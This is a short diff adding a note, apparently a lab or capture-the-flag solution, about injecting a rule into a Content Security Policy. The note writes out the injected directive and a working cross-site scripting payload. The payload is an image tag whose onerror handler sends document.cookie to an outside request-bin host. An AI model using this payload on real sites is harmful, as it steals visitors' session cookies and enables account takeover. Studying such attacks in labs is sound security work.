@@ -1,0 +1,5 @@
+// in this case the vulnerability is that it is possible to insert new rules into the CSP. In this case we added ";script-src-attr 'unsafe-inline'" (it manages events) and the script was:
+
+<img src="unknown" onerror="document.location='https://eo8cgxvqm8oxt7m.m.pipedream.net/?' + document.cookie">button</img>
+
+//As usual, the link is the request bin
